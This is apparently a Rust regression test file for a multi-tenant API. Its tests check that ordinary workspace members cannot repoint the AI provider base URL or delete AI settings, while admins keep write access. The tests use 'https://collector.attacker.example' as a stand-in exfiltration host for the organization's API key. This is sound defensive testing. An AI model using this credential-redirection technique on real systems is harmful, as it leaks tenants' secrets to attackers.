//! Organization AI settings need an organization admin to write; the workspace
//! settings that *override* them asked only for a workspace member. A member
//! could therefore repoint the provider host for everyone in the workspace --
//! admins and owners included -- while the organization's own credential stayed
//! in effect and travelled to the host they chose.
//!
//! `cross_tenant_authorization_tests` already pins that a stranger cannot
//! repoint another tenant's model host. This pins that a member of the tenant
//! cannot either.

mod common;

use axum::http::StatusCode;
use serde_json::json;

use common::{TestClient, test_email, test_password};

struct Account {
    token: String,
    user: String,
}

async fn account(client: &TestClient) -> Account {
    let response = client
        .post_json(
            "/api/auth/register",
            &json!({ "email": test_email(), "password": test_password() }),
        )
        .await;
    let body = response.json_value();
    Account {
        token: body["access_token"]
            .as_str()
            .expect("registration returns an access token")
            .to_string(),
        user: body["user"]["id"]
            .as_str()
            .expect("registration returns the user")
            .to_string(),
    }
}

async fn organization(client: &TestClient, token: &str) -> String {
    let response = client
        .post_json_auth(
            "/api/organizations",
            &json!({ "name": "Tenant", "slug": uuid::Uuid::new_v4().to_string() }),
            token,
        )
        .await;
    response.json_value()["organization"]["id"]
        .as_str()
        .expect("organization is created")
        .to_string()
}

async fn workspace(client: &TestClient, token: &str, organization: &str) -> String {
    let response = client
        .post_json_auth(
            &format!("/api/organizations/{organization}/workspaces"),
            &json!({ "name": "Tenant workspace", "slug": uuid::Uuid::new_v4().to_string() }),
            token,
        )
        .await;
    response.json_value()["workspace"]["id"]
        .as_str()
        .expect("workspace is created")
        .to_string()
}

/// Seat `user` in the organization and then in the workspace, because the
/// workspace settings check organization membership before workspace role.
async fn seat(
    client: &TestClient,
    token: &str,
    org: &str,
    ws: &str,
    user: &str,
    workspace_role: &str,
) {
    client
        .post_json_auth(
            &format!("/api/organizations/{org}/members"),
            &json!({ "user_id": user, "role": "member" }),
            token,
        )
        .await
        .assert_status(StatusCode::CREATED);
    client
        .post_json_auth(
            &format!("/api/workspaces/{ws}/members"),
            &json!({ "user_id": user, "role": workspace_role }),
            token,
        )
        .await
        .assert_status(StatusCode::CREATED);
}

#[tokio::test]
async fn a_workspace_member_cannot_repoint_the_provider_host_for_the_workspace() {
    let client = TestClient::with_db().await;
    let owner = account(&client).await;
    let hand = account(&client).await;
    let org = organization(&client, &owner.token).await;
    let ws = workspace(&client, &owner.token, &org).await;
    seat(&client, &owner.token, &org, &ws, &hand.user, "member").await;

    client
        .put_json_auth(
            &format!("/api/organizations/{org}/settings/ai"),
            &json!({ "provider": "openai", "openai_api_key": "sk-the-tenants-own-key" }),
            &owner.token,
        )
        .await
        .assert_status(StatusCode::OK);

    let refused_at_the_organization = client
        .put_json_auth(
            &format!("/api/organizations/{org}/settings/ai"),
            &json!({ "openai_base_url": "https://collector.attacker.example" }),
            &hand.token,
        )
        .await;
    assert_eq!(
        refused_at_the_organization.status,
        StatusCode::FORBIDDEN,
        "a member rewrote the organization's AI settings: {}",
        refused_at_the_organization.text()
    );

    let seized = client
        .put_json_auth(
            &format!("/api/organizations/{org}/workspaces/{ws}/settings/ai"),
            &json!({ "openai_base_url": "https://collector.attacker.example" }),
            &hand.token,
        )
        .await;
    assert_eq!(
        seized.status,
        StatusCode::FORBIDDEN,
        "a member repointed the workspace's provider host instead: {}",
        seized.text()
    );

    let effective = client
        .get_auth(
            &format!("/api/organizations/{org}/workspaces/{ws}/settings/ai/effective"),
            &owner.token,
        )
        .await;
    let effective = effective.json_value();
    assert_eq!(
        effective["has_openai_api_key"],
        json!(true),
        "the organization's credential is what a repointed host would have been handed"
    );
    assert_eq!(
        effective["openai_base_url"],
        json!(null),
        "the owner's own chats now resolve through the member's host"
    );
}

#[tokio::test]
async fn a_workspace_member_cannot_erase_the_workspace_ai_settings() {
    let client = TestClient::with_db().await;
    let owner = account(&client).await;
    let hand = account(&client).await;
    let org = organization(&client, &owner.token).await;
    let ws = workspace(&client, &owner.token, &org).await;
    seat(&client, &owner.token, &org, &ws, &hand.user, "member").await;

    client
        .put_json_auth(
            &format!("/api/organizations/{org}/workspaces/{ws}/settings/ai"),
            &json!({ "provider": "openai", "model_fast": "the-owners-choice" }),
            &owner.token,
        )
        .await
        .assert_status(StatusCode::OK);

    let erased = client
        .delete_auth(
            &format!("/api/organizations/{org}/workspaces/{ws}/settings/ai"),
            &hand.token,
        )
        .await;
    assert_eq!(
        erased.status,
        StatusCode::FORBIDDEN,
        "a member erased the workspace's AI settings: {}",
        erased.text()
    );
}

#[tokio::test]
async fn a_workspace_admin_still_writes_and_every_member_still_reads() {
    let client = TestClient::with_db().await;
    let owner = account(&client).await;
    let deputy = account(&client).await;
    let hand = account(&client).await;
    let org = organization(&client, &owner.token).await;
    let ws = workspace(&client, &owner.token, &org).await;
    seat(&client, &owner.token, &org, &ws, &deputy.user, "admin").await;
    seat(&client, &owner.token, &org, &ws, &hand.user, "member").await;

    let written = client
        .put_json_auth(
            &format!("/api/organizations/{org}/workspaces/{ws}/settings/ai"),
            &json!({ "provider": "openai", "model_fast": "the-deputys-choice" }),
            &deputy.token,
        )
        .await;
    assert_eq!(
        written.status,
        StatusCode::OK,
        "a workspace admin was refused the settings their role administers: {}",
        written.text()
    );

    let read = client
        .get_auth(
            &format!("/api/organizations/{org}/workspaces/{ws}/settings/ai"),
            &hand.token,
        )
        .await;
    assert_eq!(
        read.status,
        StatusCode::OK,
        "a member can no longer read the settings their chats run under: {}",
        read.text()
    );
    assert_eq!(
        read.json_value()["model_fast"],
        json!("the-deputys-choice"),
        "the member read something other than what the admin wrote"
    );

    client
        .delete_auth(
            &format!("/api/organizations/{org}/workspaces/{ws}/settings/ai"),
            &deputy.token,
        )
        .await
        .assert_status(StatusCode::NO_CONTENT);
}
